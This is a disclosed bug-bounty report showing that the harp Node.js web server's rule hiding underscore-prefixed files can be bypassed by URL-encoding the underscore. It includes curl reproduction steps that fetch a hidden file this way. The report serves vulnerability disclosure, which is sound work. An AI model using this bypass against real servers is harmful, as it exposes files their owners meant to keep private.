# [harp] File access even when they have been set to be ignored.

## Report Details
- **Report ID**: 453820
- **URL**: https://hackerone.com/reports/453820
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-12-02T12:31:43.432Z
- **Disclosed**: 2019-04-06T18:09:45.904Z

## Reporter
- **Username**: skyn3t
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report information disclosure through file access in harp.
It allows to access files that are supposed to be ignored according to the harp server [rules](http://harpjs.com/docs/development/rules).


# Module

**module name:** harp
**version:** 0.29.0
**npm page:** `https://www.npmjs.com/package/harp`

## Module Description

zero-configuration web server with built in pre-processing

## Module Stats
3,576 downloads in the last week

# Vulnerability

## Vulnerability Description

> #### Ignore those which start with underscore.
Any files or directories that begin with underscore will be ignored by the server. This is the recommended naming convention for layout and partial files. Harp will honour this rule for both files and directories.

> #### Design Rationale
By having a simple convention, it is easy to specify and identify which assets will not be served to the end user.

> #### Example
```
 myapp.harp.io/
   +- public/
       |- index.html            <-- will be served
       |- _some-partial.jade    <-- won't be served
       +- _shared-partials/     <-- won't be served
           +- nav.jade
```

This rule can be bypassed by url encoding the name of the file or directory that has been forbidden.


## Steps To Reproduce:

- Install harpjs 

```
yarn global add harp
```

- Run harp server 

```
harp server
```

- Create a file `_secret` which should be ignored inside project directory

```
echo secret text >> _secret.txt
```

- Request the file with `curl`

```
curl --path-as-is 0.0.0.0:9000/_secret.txt
...
<h1>404</h1><h2>Page Not Found</h2>
...
```

- The url encoded value for _ is %5f. So after replacing an e with its url encoded form, we are able to access the file.

```
curl --path-as-is 0.0.0.0:9000/%5fsecret.txt  
secret text
```



## Supporting Material/References:

- Ubuntu 16.04
- node v11.3.0
- npm 6.4.1

# Wrap up


- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

The essentially bypasses the ignore files/folders feature and allows an attacker to read from a directory/file that the victim has not allowed access to.

## Attachments
No attachments
